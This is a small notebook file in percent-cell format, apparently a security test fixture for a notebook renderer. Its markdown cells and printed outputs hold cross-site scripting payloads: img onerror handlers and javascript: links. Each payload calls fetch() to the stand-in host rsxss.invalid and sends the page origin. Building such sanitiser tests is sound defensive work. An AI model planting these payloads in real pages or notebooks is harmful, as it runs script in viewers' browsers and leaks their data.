# %% [markdown]
# # md cell
# <img src=x onerror="fetch('https://rsxss.invalid/nb-md-html?o='+location.origin)">
# <a href="javascript:fetch('https://rsxss.invalid/nb-md-jsuri')">click</a>

# %%
print('x')
# Out:
# <img src=x onerror="fetch('https://rsxss.invalid/nb-out-html?o='+location.origin)">
# [xss](javascript:fetch('https://rsxss.invalid/nb-out-md-jsuri'))
# <img src=x onerror="fetch('https://rsxss.invalid/nb-stream?o='+location.origin)">

# %% [markdown]
# ![a](attachment:a.png)
